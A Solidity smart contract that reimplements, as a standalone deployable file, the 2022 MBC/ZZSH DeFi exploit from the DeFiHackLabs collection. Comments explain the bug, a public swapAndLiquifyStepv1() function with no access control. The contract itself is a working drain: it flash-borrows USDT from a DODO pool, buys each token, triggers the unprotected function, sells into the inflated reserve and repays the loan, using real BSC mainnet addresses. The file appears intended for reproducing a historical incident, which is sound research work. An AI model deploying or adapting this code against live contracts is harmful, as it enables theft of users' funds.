// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-MBC_ZZSH).
//
// The DeFiHackLabs PoC (test/MBC_ZZSH_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself (`assetTo = address(this)`), and
// profit is measured on the test contract's own USDT balance — so there is no
// standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack (testExploit body → run(); DPPFlashLoanCall callback +
// minimal inline interfaces — no imports so it compiles anywhere), compiled
// inside the registry forge project. Logic and constants are copied verbatim
// from test/MBC_ZZSH_exp.sol.
//
// Root cause: MBC/ZZSH expose `swapAndLiquifyStepv1()` as a PUBLIC,
// no-access-control function that unconditionally pushes the token contract's
// whole accumulated USDT + token balance into its PancakeSwap pair via
// `addLiquidity` (amountMin=0,0, LP minted to the owner). An attacker can buy
// (which seeds the contract with fee-USDT), call swapAndLiquifyStepv1() to
// inject that USDT into the pool's reserve (deepening it), then sell back into
// the artificially-deep reserve for a profit. Repeated across the two identical
// tokens in one DODO flash-loaned transaction it nets +5,930.68 USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    // NOTE: approve/transfer intentionally have NO return value. BSC USDT
    // (Binance-Peg) is a legacy contract whose approve/transfer return void,
    // and solc 0.8.x reverts a call that expects a `bool` return but gets none.
    // Declaring them void (mirroring the registry's own `interface USDT`)
    // avoids that decode/revert. MBC/ZZSH are also fine being called this way.
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniswapV2Router {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IToken {
    function swapAndLiquifyStepv1() external;
}

contract MBC_ZZSHDrain {
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant MBC = 0x4E87880A72f6896E7e0a635A5838fFc89b13bd17;
    address constant ZZSH = 0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6;
    address constant DODO = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MBC_PAIR = 0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1; // token0=MBC, token1=USDT
    address constant ZZSH_PAIR = 0x33CCA0E0CFf617a2aef1397113E779E42a06a74A; // token0=USDT, token1=ZZSH

    uint256 dodoFlashLoanAmount;

    // step 1: flash-borrow ALL USDT from the DODO DVM pool. The callback below drains both tokens.
    function run() external {
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        IERC20(MBC).approve(ROUTER, type(uint256).max);
        IERC20(ZZSH).approve(ROUTER, type(uint256).max);
        dodoFlashLoanAmount = IERC20(USDT).balanceOf(DODO);
        IDVM(DODO).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
    }

    // DODO V2 flash-loan callback (DPPFlashLoanCall). The pool optimistically
    // sent out the USDT; here the attacker sandwiches swapAndLiquifyStepv1()
    // on MBC then on ZZSH, repaying the flash loan at the end.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        // ---- MBC leg ----
        // Initial rate MBC/USDT -> 1.1365032200116891/1
        // Pair getReserves -> 12475110456913920021663 / 10976748888389080860664
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = MBC;
        uint256[] memory values = IUniswapV2Router(ROUTER).getAmountsOut(150_000 * 10 ** 18, path);

        // 1. buy MBC: send USDT to the pair, swap MBC out (fee-on-transfer skims it)
        IERC20(USDT).transfer(MBC_PAIR, 150_000 * 10 ** 18);
        IUniswapV2Pair(MBC_PAIR).swap(values[1], 0, address(this), "");

        // 2. THE BUG: anyone can push the contract's accumulated fee USDT into the pool reserve
        IToken(MBC).swapAndLiquifyStepv1();

        // Altered rate MBC/USDT -> 0.0052991665156216445/1
        // Pair getReserves -> 900258815097978209431 / 169886870405763976494888

        // 3. sell MBC back into the deepened USDT reserve (donate 1001 wei to trip _isAddLiquidityV1)
        IERC20(USDT).transfer(MBC_PAIR, 1001); // function() _isAddLiquidityV1()
        IERC20(MBC).transfer(MBC_PAIR, IERC20(MBC).balanceOf(address(this)));
        (uint256 mbcReserve, , ) = IUniswapV2Pair(MBC_PAIR).getReserves();
        uint256 amountIn = IERC20(MBC).balanceOf(MBC_PAIR) - mbcReserve;
        path[0] = MBC;
        path[1] = USDT;
        values = IUniswapV2Router(ROUTER).getAmountsOut(amountIn, path);
        IUniswapV2Pair(MBC_PAIR).swap(0, values[1], address(this), "");

        // ---- ZZSH leg (identical pattern, mirrored token ordering) ----
        path[0] = USDT;
        path[1] = ZZSH;
        values = IUniswapV2Router(ROUTER).getAmountsOut(150_000 * 10 ** 18, path);

        IERC20(USDT).transfer(ZZSH_PAIR, 150_000 * 10 ** 18);
        IUniswapV2Pair(ZZSH_PAIR).swap(0, values[1], address(this), "");

        IToken(ZZSH).swapAndLiquifyStepv1();

        IERC20(USDT).transfer(ZZSH_PAIR, 1001); // function() _isAddLiquidityV1()
        IERC20(ZZSH).transfer(ZZSH_PAIR, IERC20(ZZSH).balanceOf(address(this)));
        (, uint256 zzshReserve, ) = IUniswapV2Pair(ZZSH_PAIR).getReserves();
        amountIn = IERC20(ZZSH).balanceOf(ZZSH_PAIR) - zzshReserve;
        path[0] = ZZSH;
        path[1] = USDT;
        values = IUniswapV2Router(ROUTER).getAmountsOut(amountIn, path);
        IUniswapV2Pair(ZZSH_PAIR).swap(values[1], 0, address(this), "");

        // ---- repay the DODO flash loan (0 fee) ----
        IERC20(USDT).transfer(DODO, dodoFlashLoanAmount);
    }
}
